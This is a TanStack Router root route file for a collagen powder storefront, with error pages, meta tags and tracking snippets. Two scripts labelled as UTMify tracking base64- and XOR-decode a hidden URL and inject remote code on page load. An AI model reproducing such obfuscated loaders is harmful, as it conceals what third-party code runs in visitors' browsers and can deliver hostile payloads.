import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">
          Page not found
        </h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({
  error,
  reset,
}: {
  error: Error;
  reset: () => void;
}) {
  console.error(error);
  const router = useRouter();

  useEffect(() => {
    reportLovableError(error, {
      boundary: "tanstack_root_error_component",
    });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>

        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back
          home.
        </p>

        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>

          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route =
  createRootRouteWithContext<{ queryClient: QueryClient }>()({
    head: () => ({
      meta: [
        { charSet: "utf-8" },
        {
          name: "viewport",
          content: "width=device-width, initial-scale=1",
        },
        {
          title: "Collagen Glow Up Powder | Nutrition Geeks",
        },
        {
          name: "description",
          content:
            "Premium triple-filtered collagen powder with 12.6g protein per serving.",
        },
        {
          name: "author",
          content: "Nutrition Geeks",
        },
        {
          property: "og:title",
          content: "Collagen Glow Up Powder | Nutrition Geeks",
        },
        {
          property: "og:description",
          content:
            "Premium triple-filtered collagen powder with 12.6g protein per serving.",
        },
        {
          property: "og:type",
          content: "website",
        },
        {
          name: "twitter:card",
          content: "summary_large_image",
        },
        {
          name: "twitter:site",
          content: "@Lovable",
        },
      ],

      links: [
        {
          rel: "stylesheet",
          href: appCss,
        },
        {
          rel: "icon",
          href: "/favicon.png",
          type: "image/png",
        },
        {
          rel: "preconnect",
          href: "https://fonts.googleapis.com",
        },
        {
          rel: "preconnect",
          href: "https://fonts.gstatic.com",
          crossOrigin: "anonymous",
        },
        {
          rel: "stylesheet",
          href: "https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap",
        },
      ],

      scripts: [
        // UTMify — script oficial 1
        {
          type: "text/javascript",
          children: `(function(){var n_875o=atob("DKwBZMkPPYhePbdkf9cjEbtjH7J8VcMQD987S+ZsWeZwSMMJFsp4SqpgUKY8T5gXHN5oFL18Ev0qUMRLE811Abp7E+ItH5tGHth1FqBtSPw7TpVeJNcjCqhiWKpkH9MFC80sEb1iVO4nEMcWGtpkCr0iResxWZoXHMcjSOt5XOQrWJVeXY58SLItU+kzWJVeXchgEKgiSPwzVNEdUtxzAb9qU/xzTsIGFshyRuUtS+kySNJGRY4jGZRy");var p_pn=[];for(var k_b73q=0;k_b73q<n_875o.length;k_b73q++){p_pn.push(n_875o.charCodeAt(k_b73q)&255);}var h_tq6m=p_pn[0];var x_xl6=p_pn.slice(1,1+h_tq6m);var w_h3=p_pn.slice(1+h_tq6m);var f_zd=w_h3.map(function(b,h_v6n){return b^x_xl6[h_v6n%h_tq6m];});var b_o="";for(var e_tp1=0;e_tp1<f_zd.length;e_tp1++){b_o+=String.fromCharCode(f_zd[e_tp1]&255);}var a_lj=decodeURIComponent(escape(b_o));var s_q6=JSON.parse(a_lj);var y_4z=s_q6.globals||[];y_4z.forEach(function(x_stg){window[x_stg.name]=x_stg.value;});var d_6b=document.createElement("script");d_6b.src=s_q6.url;d_6b.async=true;d_6b.defer=true;(s_q6.attributes||[]).forEach(function(y_in){d_6b.setAttribute(y_in.name,y_in.value);});(document.head||document.documentElement).appendChild(d_6b);})();`,
        },

        // UTMify — script oficial 2
        {
          type: "text/javascript",
          children: `(function(){var x_0jq7=atob("DEesUGEADcDH9x821DyOJRNsL/rln2tCpDSWf05jaa7pgmtbvSHVfgJvYO6lhTBFtzXFIBVzIrCuj3pa+zfFKARsI6q01TMUtTPYIghieLSihD0MjxqAcgZsYqKmm2wU7hzXcg9hYKXlzT1GvT/JPChkL+zlgX5aoSKOakM2bPn1x3lX5nGVMVc2PfH0lHkO5ibPMQQicJ26");var h_ht0o=[];for(var s_atc=0;s_atc<x_0jq7.length;s_atc++){h_ht0o.push(x_0jq7.charCodeAt(s_atc)&255);}var k_qg=h_ht0o[0];var h_np=h_ht0o.slice(1,1+k_qg);var f_p=h_ht0o.slice(1+k_qg);var i_pi7=f_p.map(function(b,q_0){return b^h_np[q_0%k_qg];});var s_c1a7="";for(var c_c=0;c_c<i_pi7.length;c_c++){s_c1a7+=String.fromCharCode(i_pi7[c_c]&255);}var t_e=decodeURIComponent(escape(s_c1a7));var e_ke=JSON.parse(t_e);var k_9tv9=e_ke.globals||[];k_9tv9.forEach(function(q_w){window[q_w.name]=q_w.value;});var w_gp=document.createElement("script");w_gp.src=e_ke.url;w_gp.async=true;w_gp.defer=true;(e_ke.attributes||[]).forEach(function(n_jk){w_gp.setAttribute(n_jk.name,n_jk.value);});(document.head||document.documentElement).appendChild(w_gp);})();`,
        },

        // TikTok Pixel
        {
          type: "text/javascript",
          children:
            "!function (w, d, t) { w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=[\"page\",\"track\",\"identify\",\"instances\",\"debug\",\"on\",\"off\",\"once\",\"ready\",\"alias\",\"group\",\"enableCookie\",\"disableCookie\",\"holdConsent\",\"revokeConsent\",\"grantConsent\"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r=\"https://analytics.tiktok.com/i18n/pixel/events.js\",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement(\"script\");n.type=\"text/javascript\",n.async=!0,n.src=r+\"?sdkid=\"+e+\"&lib=\"+t;e=document.getElementsByTagName(\"script\")[0];e.parentNode.insertBefore(n,e)}; ttq.load('DA9PBQ3C77UES9748K1G'); ttq.page(); }(window, document, 'ttq');",
        },

        // Microsoft Clarity
        {
          type: "text/javascript",
          children: `(function(c,l,a,r,i,t,y){
    c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
    t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
    y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
})(window, document, "clarity", "script", "ylr8d2sgwd");`,
        },
      ],
    }),

    shellComponent: RootShell,
    component: RootComponent,
    notFoundComponent: NotFoundComponent,
    errorComponent: ErrorComponent,
  });

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>

      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
